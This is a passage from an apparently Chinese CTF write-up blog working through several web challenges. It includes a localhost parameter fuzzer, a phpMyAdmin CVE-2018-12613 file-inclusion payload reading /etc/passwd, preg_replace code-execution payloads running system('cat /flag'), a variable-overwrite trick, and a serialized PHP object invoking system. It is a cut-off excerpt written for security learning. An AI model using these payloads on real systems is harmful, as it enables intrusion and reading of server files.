</span></span><span class="line"><span class="cl">        <span class="n">params</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">params</span><span class="p">[</span><span class="n">i</span><span class="p">][:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">][:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://127.0.0.1/src/&#39;</span> <span class="o">+</span> <span class="n">file</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;glzjin&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">mutex</span><span class="o">.</span><span class="n">acquire</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">file</span> <span class="o">+</span> <span class="s2">&#34; found!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">mutex</span><span class="o">.</span><span class="n">release</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="c1"># system test</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">params</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">params</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;echo glzjin&#39;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;echo glzjin&#39;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://127.0.0.1/src/&#39;</span> <span class="o">+</span> <span class="n">file</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;glzjin&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">mutex</span><span class="o">.</span><span class="n">acquire</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">file</span> <span class="o">+</span> <span class="s2">&#34; found!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">mutex</span><span class="o">.</span><span class="n">release</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="c1"># print(&#34;====================&#34;)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">file</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>  <span class="c1"># 遍历文件夹</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isdir</span><span class="p">(</span><span class="n">file</span><span class="p">):</span>  <span class="c1"># 判断是否是文件夹，不是文件夹才打开</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># read_file(file)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">        <span class="n">pool</span><span class="o">.</span><span class="n">submit</span><span class="p">(</span><span class="n">read_file</span><span class="p">,</span> <span class="n">file</span><span class="p">)</span></span></span></code></pre></div><h2 id="0x23gwctf-2019我有一个数据库" class="heading-element">
  <a href="#0x23gwctf-2019%e6%88%91%e6%9c%89%e4%b8%80%e4%b8%aa%e6%95%b0%e6%8d%ae%e5%ba%93" class="heading-mark"></a>0x23.[GWCTF 2019]我有一个数据库</h2><p>考点就是：phpMyadmin(CVE-2018-12613)后台任意文件包含漏洞</p>
<p>怎么说呢，有点离谱，啥都没有就能知道是这个洞？</p>
<p>有人说猜到有phpmyadmin直接进去了，，，行吧。</p>
<blockquote>
<p>phpMyadmin(CVE-2018-12613)后台任意文件包含漏洞</p>
<p>影响版本：4.8.0——4.8.1</p>
<p>payload: /phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../etc/passwd</p>
</blockquote>
<p>可以正常出现，文件改为flag就出来了</p>
<h2 id="0x24bjdctf2020zjctf不过如此" class="heading-element">
  <a href="#0x24bjdctf2020zjctf%e4%b8%8d%e8%bf%87%e5%a6%82%e6%ad%a4" class="heading-mark"></a>0x24.[BJDCTF2020]ZJCTF，不过如此</h2><blockquote>
<p>知识点：</p>
<p>preg_replace代码执行，</p>
<p>先知社区：https://xz.aliyun.com/t/2557</p>
<p>国光师傅：https://www.sqlsec.com/2020/07/preg_replace.html</p>
</blockquote>
<p>审计：</p>
<div class="highlight" id="id-5"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$text</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;text&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$text</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$text</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">===</span><span class="s2">&#34;I have a dream&#34;</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&lt;h1&gt;&#34;</span><span class="o">.</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$text</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;&lt;/h1&gt;&lt;/br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag/&#34;</span><span class="p">,</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Not now!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>  <span class="c1">//next.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>构造payload：<code>?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</code>读next.php</p>
<div class="highlight" id="id-6"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">complex</span><span class="p">(</span><span class="nv">$re</span><span class="p">,</span> <span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">preg_replace</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;/(&#39;</span> <span class="o">.</span> <span class="nv">$re</span> <span class="o">.</span> <span class="s1">&#39;)/ei&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;strtolower(&#34;\\1&#34;)&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$str</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$re</span> <span class="o">=&gt;</span> <span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">complex</span><span class="p">(</span><span class="nv">$re</span><span class="p">,</span> <span class="nv">$str</span><span class="p">)</span><span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">getFlag</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">	<span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>存在preg_replace代码执行，但是如果GET传<code>.*=xxx</code>，会出问题，成为_*=xxx</p>
<p>所以有这样的payload：<code>\S*=${phpinfo()}</code></p>
<p>接下来就有两种解法：</p>
<p><strong>解法一</strong>：使用源码中给的函数</p>
<p><code>/next.php?\S*=${getflag()}&amp;cmd=show_source(&quot;&quot;/flag&quot;);</code></p>
<p><strong>解法二</strong>：通过POST传参</p>
<pre tabindex="0"><code>next.php?\S*=${eval($_POST[cmd])};
aaa=system(&#34;cat /flag&#34;);</code></pre><p>或者GET：</p>
<div class="highlight" id="id-8"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">next</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">\S</span><span class="o">*=</span><span class="nx">next</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">\S</span><span class="o">*=</span><span class="err">$</span><span class="p">{</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">aaa</span><span class="p">])}</span><span class="o">&amp;</span><span class="nx">aaa</span><span class="o">=</span><span class="nx">system</span><span class="p">(</span><span class="s2">&#34;cat /flag&#34;</span><span class="p">);</span></span></span></code></pre></div><h2 id="0x25bjdctf2020mark-loves-cat" class="heading-element">
  <a href="#0x25bjdctf2020mark-loves-cat" class="heading-mark"></a>0x25.[BJDCTF2020]Mark loves cat</h2><blockquote>
<p>考点：变量覆盖</p>
</blockquote>
<p>dirsearch扫完有git泄露</p>
<p>然后我githack搞了好久需要的文件就是tmd出不来。。。</p>
<p>直接看网上的：</p>
<div class="highlight" id="id-9"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;flag.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$yds</span> <span class="o">=</span> <span class="s2">&#34;dog&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$is</span> <span class="o">=</span> <span class="s2">&#34;cat&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$handsome</span> <span class="o">=</span> <span class="s1">&#39;yds&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$x</span> <span class="o">=&gt;</span> <span class="nv">$y</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$$x</span> <span class="o">=</span> <span class="nv">$y</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$x</span> <span class="o">=&gt;</span> <span class="nv">$y</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$$x</span> <span class="o">=</span> <span class="nv">$$y</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$x</span> <span class="o">=&gt;</span> <span class="nv">$y</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$x</span> <span class="o">&amp;&amp;</span> <span class="nv">$x</span> <span class="o">!==</span> <span class="s1">&#39;flag&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">(</span><span class="nv">$handsome</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">(</span><span class="nv">$yds</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;flag&#39;</span>  <span class="o">||</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;flag&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">(</span><span class="nv">$is</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;the flag is: &#34;</span><span class="o">.</span><span class="nv">$flag</span><span class="p">;</span><span class="s2">&#34;</span></span></span></code></pre></div><p>可变变量，又叫套娃变量，可以先看下：https://www.php.net/manual/zh/language.variables.variable.php</p>
<p>先看payload再分析：</p>
<pre tabindex="0"><code>?yds=flag
post: $flag=1</code></pre><p>首先是：</p>
<div class="highlight" id="id-11"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$x</span> <span class="o">=&gt;</span> <span class="nv">$y</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$$x</span> <span class="o">=</span> <span class="nv">$y</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>那么这时$x=$flag，$y=1，然后$$x=$flag</p>
<p>然后：</p>
<div class="highlight" id="id-12"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$x</span> <span class="o">=&gt;</span> <span class="nv">$y</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$$x</span> <span class="o">=</span> <span class="nv">$$y</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>这时$x=yds,$y=flag，也就是说$$x=$yds=$flag，</p>
<h2 id="0x26网鼎杯-2020-朱雀组phpweb" class="heading-element">
  <a href="#0x26%e7%bd%91%e9%bc%8e%e6%9d%af-2020-%e6%9c%b1%e9%9b%80%e7%bb%84phpweb" class="heading-mark"></a>0x26.[网鼎杯 2020 朱雀组]phpweb</h2><p>进去之后什么都没有，然后等了几秒后有报错的信息，抓包之后有fun和p两个post的参数。</p>
<p><code>func=date&amp;p=Y-m-d+h%3Ai%3As+a</code>，php中恰好有date函数，且参数也是后面那样。</p>
<p>那么可能fun就是函数，p是参数，改个eval(&lsquo;phpinfo()&rsquo;)试一下：<code>eval('phpinfo();');</code></p>
<p>恩。。有过滤，再试试读文件：file_get_contents()</p>
<div class="highlight" id="id-13"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$disable_fun</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;exec&#34;</span><span class="p">,</span><span class="s2">&#34;shell_exec&#34;</span><span class="p">,</span><span class="s2">&#34;system&#34;</span><span class="p">,</span><span class="s2">&#34;passthru&#34;</span><span class="p">,</span><span class="s2">&#34;proc_open&#34;</span><span class="p">,</span><span class="s2">&#34;show_source&#34;</span><span class="p">,</span><span class="s2">&#34;phpinfo&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                         <span class="s2">&#34;popen&#34;</span><span class="p">,</span><span class="s2">&#34;dl&#34;</span><span class="p">,</span><span class="s2">&#34;eval&#34;</span><span class="p">,</span><span class="s2">&#34;proc_terminate&#34;</span><span class="p">,</span><span class="s2">&#34;touch&#34;</span><span class="p">,</span><span class="s2">&#34;escapeshellcmd&#34;</span><span class="p">,</span><span class="s2">&#34;escapeshellarg&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                         <span class="s2">&#34;assert&#34;</span><span class="p">,</span><span class="s2">&#34;substr_replace&#34;</span><span class="p">,</span><span class="s2">&#34;call_user_func_array&#34;</span><span class="p">,</span><span class="s2">&#34;call_user_func&#34;</span><span class="p">,</span><span class="s2">&#34;array_filter&#34;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">                         <span class="s2">&#34;array_walk&#34;</span><span class="p">,</span>  <span class="s2">&#34;array_map&#34;</span><span class="p">,</span><span class="s2">&#34;registregister_shutdown_function&#34;</span><span class="p">,</span><span class="s2">&#34;register_tick_function&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                         <span class="s2">&#34;filter_var&#34;</span><span class="p">,</span> <span class="s2">&#34;filter_var_array&#34;</span><span class="p">,</span> <span class="s2">&#34;uasort&#34;</span><span class="p">,</span> <span class="s2">&#34;uksort&#34;</span><span class="p">,</span> <span class="s2">&#34;array_reduce&#34;</span><span class="p">,</span><span class="s2">&#34;array_walk&#34;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">                         <span class="s2">&#34;array_walk_recursive&#34;</span><span class="p">,</span><span class="s2">&#34;pcntl_exec&#34;</span><span class="p">,</span><span class="s2">&#34;fopen&#34;</span><span class="p">,</span><span class="s2">&#34;fwrite&#34;</span><span class="p">,</span><span class="s2">&#34;file_put_contents&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">gettime</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$p</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$result</span> <span class="o">=</span> <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$p</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$a</span><span class="o">=</span> <span class="nx">gettype</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">==</span> <span class="s2">&#34;string&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">var</span> <span class="nv">$p</span> <span class="o">=</span> <span class="s2">&#34;Y-m-d h:i:s a&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">var</span> <span class="nv">$func</span> <span class="o">=</span> <span class="s2">&#34;date&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">func</span> <span class="o">!=</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="k">echo</span> <span class="nx">gettime</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">func</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$func</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;func&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$p</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;p&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$func</span> <span class="o">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$func</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$func</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span><span class="nv">$disable_fun</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">echo</span> <span class="nx">gettime</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$p</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">die</span><span class="p">(</span><span class="s2">&#34;Hacker...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>可以看到过滤了很多函数和字符串，而造成可以运行输入的函数就是<code>call_user_func</code>，没有禁用反序列化unserialize函数</p>
<div class="highlight" id="id-14"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">var</span> <span class="nv">$p</span> <span class="o">=</span> <span class="s2">&#34;Y-m-d h:i:s a&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">var</span> <span class="nv">$func</span> <span class="o">=</span> <span class="s2">&#34;date&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">func</span> <span class="o">!=</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="k">echo</span> <span class="nx">gettime</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">func</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Test</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">func</span> <span class="o">=</span> <span class="s2">&#34;system&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">// $a-&gt;p =  &#34;ls&#34;;
</span></span></span><span class="line"><span class="cl"><span class="c1">// $a-&gt;p =  &#34;find / -name &#39;flag*&#39;&#34;;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">p</span> <span class="o">=</span>  <span class="s2">&#34;cat /tmp/flagoefiu4r93&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">out</span><span class="o">:</span>
</span></span><span class="line"><span class="cl"><span class="nx">O</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;Test&#34;</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="s2">&#34;p&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">22</span><span class="o">:</span><span class="s2">&#34;cat /tmp/flagoefiu4r93&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;func&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;system&#34;</span><span class="p">;}</span></span></span></code></pre></div><h2 id="0x27安洵杯-2019easy_web" class="heading-element">
  <a href="#0x27%e5%ae%89%e6%b4%b5%e6%9d%af-2019easy_web" class="heading-mark"></a>0x27.[安洵杯 2019]easy_web</h2><p>url中：<code>index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code>，其中img是hex+base64+base64</p>
<p>把index.php按照上面加密后：</p>
<pre tabindex="0"><code class="language-php+HTML" data-lang="php+HTML">&lt;?php
error_reporting(E_ALL || ~ E_NOTICE);
header(&#39;content-type:text/html;charset=utf-8&#39;);
$cmd = $_GET[&#39;cmd&#39;];
if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) 
    header(&#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#39;);
$file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));

$file = preg_replace(&#34;/[^a-zA-Z0-9.]+/&#34;, &#34;&#34;, $file);
if (preg_match(&#34;/flag/i&#34;, $file)) {
    echo &#39;&lt;img src =&#34;./ctf3.jpeg&#34;&gt;&#39;;
